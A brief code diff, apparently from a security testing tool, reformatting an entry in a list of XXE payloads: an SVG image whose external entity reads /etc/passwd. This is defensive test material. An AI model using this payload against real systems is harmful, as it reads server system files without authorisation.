@@ -32,7 +32,10 @@ _XXE_PAYLOADS: list[tuple[str, str, str]] = [
     (
         "svg_xxe",
         "image/svg+xml",
-        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text>&xxe;</text></svg>',
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">'
+        '<text>&xxe;</text></svg>',
     ),
 ]
 
